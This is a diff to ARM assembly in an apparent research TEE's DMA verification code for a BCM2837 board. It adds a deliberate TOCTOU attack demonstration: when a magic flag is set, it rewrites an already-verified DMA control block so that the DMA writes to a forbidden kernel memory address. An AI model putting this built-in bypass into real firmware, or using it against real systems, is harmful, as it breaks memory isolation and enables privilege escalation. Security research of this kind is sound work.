@@ -1378,16 +1378,39 @@ b 99f
 215:
 	// load secure buffer to r2	(DMA CB verify success)
 	ldr	r2, [sp, #MYTEE_SP_OFFSET_DMA_SECURE_BUFFER]
+	
+	// ========== TOCTOU ATTACK DEMONSTRATION ==========
+	// After verification passes, we INTENTIONALLY modify the CB
+	// to point to a forbidden destination address.
+	// This demonstrates the TOCTOU vulnerability:
+	// 1. CB was verified with ALLOWED destination
+	// 2. Now we change it to FORBIDDEN destination
+	// 3. DMA will execute with the modified CB!
+	//
+	// Check TOCTOU attack enable flag
+	ldr	r0, =TOCTOU_SYNC_FLAG_VIRT
+	ldr	r1, [r0]
+	ldr	r3, =0xA77AC001		// Magic value to enable attack (ATTACK01)
+	cmp	r1, r3
+	bne	215f			// Skip if attack not enabled
+	
+	// ATTACK ENABLED: Modify CB.dst to forbidden address!
+	// CB structure: [info:4][src:4][dst:4][len:4][stride:4][next:4]
+	// dst is at offset 0x08
+	ldr	r0, =0xC0008000		// FORBIDDEN: bus address of kernel low memory
+	str	r0, [r2, #0x08]		// Overwrite dst field!
+	dmb
+	
+	// Log attack in sync flag area
+	ldr	r0, =TOCTOU_SYNC_FLAG_VIRT
+	ldr	r1, =0xDEAD0003		// Signal: CB was modified
+	str	r1, [r0]
+	dmb
+	
+215:
+	ldr	r2, [sp, #MYTEE_SP_OFFSET_DMA_SECURE_BUFFER]
 	add	r2, r2, #BCM2837_BUS_VIRT_OFFSET	// change to secure buffer bus address from first 
 			// DMA CB address bus address(which be mapped to bcm2835 dma phys address 0x3f007000)
-
-	// NOTE: TOCTOU vulnerability exists here!
-	// An attacker with EL2 privilege can call MYTEE_TOCTOU_INJECT HVC
-	// to modify the CB in secure buffer AFTER verification passes
-	// but BEFORE DMA execution continues below.
-	//
-	// The MYTEE_TOCTOU_INJECT (150) HVC handler allows direct
-	// modification of CB.dst field in secure buffer.
 
 	b	200f
 214:	// load saved context to r2	(verify skip)
